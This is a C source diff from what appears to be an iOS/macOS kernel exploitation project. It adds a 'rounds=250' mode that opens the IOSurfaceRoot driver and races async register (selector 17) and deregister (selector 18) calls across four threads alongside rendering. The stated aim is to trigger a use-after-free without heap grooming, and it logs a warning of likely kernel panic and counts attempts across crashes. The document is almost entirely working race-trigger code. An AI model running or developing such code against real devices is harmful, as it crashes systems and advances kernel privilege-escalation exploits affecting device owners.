@@ -1002,6 +1002,41 @@ static void *race_thread_fn(void *arg) {
     return NULL;
 }
 
+/* rounds=250 multi-threaded race globals */
+static volatile int g_race250_run = 0;
+static io_connect_t g_race250_conn = IO_OBJECT_NULL;
+static volatile int g_race250_reg_ok = 0, g_race250_reg_fail = 0;
+static volatile int g_race250_dereg_ok = 0, g_race250_dereg_fail = 0;
+
+static void *g_race250_sel17_fn(void *arg) {
+    (void)arg;
+    uint64_t inp[3] = {1, 2, 3};
+    while (g_race250_run) {
+        mach_port_t wp = MACH_PORT_NULL;
+        mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &wp);
+        mach_port_insert_right(mach_task_self(), wp, wp, MACH_MSG_TYPE_MAKE_SEND);
+        uint64_t ref = 0xD250;
+        kern_return_t kr = IOConnectCallAsyncMethod(g_race250_conn, 17, wp, &ref, 1,
+            NULL, 0, inp, 24, NULL, NULL, NULL, NULL);
+        if (kr == 0) __sync_fetch_and_add(&g_race250_reg_ok, 1);
+        else __sync_fetch_and_add(&g_race250_reg_fail, 1);
+        mach_port_deallocate(mach_task_self(), wp);
+    }
+    return NULL;
+}
+
+static void *g_race250_sel18_fn(void *arg) {
+    (void)arg;
+    uint64_t inp[3] = {1, 2, 3};
+    while (g_race250_run) {
+        kern_return_t kr = IOConnectCallMethod(g_race250_conn, 18, NULL, 0,
+            inp, 24, NULL, NULL, NULL, NULL);
+        if (kr == 0) __sync_fetch_and_add(&g_race250_dereg_ok, 1);
+        else __sync_fetch_and_add(&g_race250_dereg_fail, 1);
+    }
+    return NULL;
+}
+
 static int g_main_argc;
 static char **g_main_argv;
 
@@ -19491,6 +19526,81 @@ new_modes:
             IOObjectRelease(r249_svc);
             r249_done:
             rlog("*** r=249 complete ***\n");
+            goto done;
+        }
+        if (rounds == 250) {
+            rlog("*** rounds=250: Multi-threaded race + concurrent render ***\n");
+            rlog("  4 threads (2x sel17, 2x sel18) + render during race\n");
+            rlog("  No pre-groom — raw heap, maximizing race window\n\n");
+
+            /* Recovery tracking */
+            char r250_sp[256];
+            { char *h = getenv("HOME"); snprintf(r250_sp, sizeof(r250_sp), "%s/Documents/uaf250_state.bin", h?h:"/tmp"); }
+            int r250_att = 0;
+            { FILE *f = fopen(r250_sp, "rb"); if (f) { uint32_t m; if (fread(&m,4,1,f)==1 && m==0xDEAD0250) fread(&r250_att,4,1,f); fclose(f); } }
+            r250_att++;
+            rlog("  Attempt #%d\n", r250_att);
+            { FILE *f = fopen(r250_sp, "wb"); if (f) { uint32_t m=0xDEAD0250; fwrite(&m,4,1,f); fwrite(&r250_att,4,1,f); fflush(f); fsync(fileno(f)); fclose(f); } }
+
+            io_service_t r250_svc = IOServiceGetMatchingService(kIOMasterPortDefault,
+                IOServiceMatching("IOSurfaceRoot"));
+            if (!r250_svc) { rlog("  NO IOSurfaceRoot!\n"); goto r250_done; }
+
+            io_connect_t r250_rc = IO_OBJECT_NULL;
+            IOServiceOpen(r250_svc, mach_task_self(), 0, &r250_rc);
+            if (!r250_rc) { rlog("  open failed\n"); goto r250_done; }
+
+            /* Use global race state vars (declared at file scope) */
+            g_race250_conn = r250_rc;
+            g_race250_run = 0;
+            g_race250_reg_ok = 0; g_race250_reg_fail = 0;
+            g_race250_dereg_ok = 0; g_race250_dereg_fail = 0;
+
+            rlog("  Starting concurrent race (5s) + render...\n");
+            rlog("  >>> WARNING: HIGH PROBABILITY OF KERNEL PANIC <<<\n");
+            fflush(stdout);
+
+            /* Start render FIRST */
+            p13_render_run = 1;
+            p13_render_frames = 0;
+            pthread_t r250_render;
+            pthread_create(&r250_render, NULL, p13_render_loop, NULL);
+
+            /* Start 2 sel17 + 2 sel18 threads */
+            g_race250_run = 1;
+            pthread_t r250_t[4];
+            pthread_create(&r250_t[0], NULL, g_race250_sel17_fn, NULL);
+            pthread_create(&r250_t[1], NULL, g_race250_sel17_fn, NULL);
+            pthread_create(&r250_t[2], NULL, g_race250_sel18_fn, NULL);
+            pthread_create(&r250_t[3], NULL, g_race250_sel18_fn, NULL);
+
+            /* Run for 5 seconds */
+            for (int s = 0; s < 5; s++) {
+                usleep(1000000);
+                rlog("  +%ds reg=%d/%d dereg=%d/%d frames=%d\n", s+1,
+                     g_race250_reg_ok, g_race250_reg_fail,
+                     g_race250_dereg_ok, g_race250_dereg_fail,
+                     p13_render_frames);
+            }
+
+            /* Stop race threads */
+            g_race250_run = 0;
+            for (int i = 0; i < 4; i++) pthread_join(r250_t[i], NULL);
+
+            /* Stop render */
+            p13_render_run = 0;
+            pthread_join(r250_render, NULL);
+
+            rlog("\n  === SURVIVED multi-threaded race! ===\n");
+            rlog("  Total: reg=%d/%d dereg=%d/%d frames=%d\n",
+                 g_race250_reg_ok, g_race250_reg_fail,
+                 g_race250_dereg_ok, g_race250_dereg_fail,
+                 p13_render_frames);
+
+            IOServiceClose(r250_rc);
+            IOObjectRelease(r250_svc);
+            r250_done:
+            rlog("*** r=250 complete ***\n");
             goto done;
         }
         if (rounds >= 170 && rounds != 219 && rounds != 225) {
